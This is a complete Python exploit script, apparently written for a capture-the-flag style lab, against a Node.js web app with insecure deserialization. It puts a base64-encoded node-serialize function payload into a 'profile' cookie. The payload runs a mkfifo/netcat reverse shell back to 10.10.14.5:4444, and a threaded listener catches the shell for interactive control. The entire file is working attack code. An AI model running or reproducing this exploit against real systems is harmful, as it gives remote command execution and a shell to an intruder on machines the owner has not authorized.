#!/usr/bin/python3

import argparse
import requests
import sys, os
import socket
import telnetlib
from threading import Thread
from bs4 import BeautifulSoup
import base64
import warnings

# Setup
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

# Create the Functions

def handler():
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',4444))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection received") 
    t.sock = conn
    t.interact()

def deserializationRCE(rhosts):

    URL = 'http://%s:3000'%rhosts
    
    payload = '{"username": "_$$ND_FUNC$$_function(){\\n  require(\'child_process\').execSync(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f\\", function puts(error, stdout, stderr) {});\\n }()","country": "Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}'
    payload = base64.b64encode(payload.encode()).decode()

    cookies = { 'profile': payload }

    print("[+] Getting Reverse Shell")

    r.get(URL, verify=False, proxies=proxies, cookies=cookies)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)

    args = parser.parse_args()
    
    rhost = args.target

    # Call the functions
    # Calling handler
    thr = Thread(target=handler)
    thr.start()

    # Node Deserializaton
    deserializationRCE(rhost)


if __name__ == '__main__':
    main()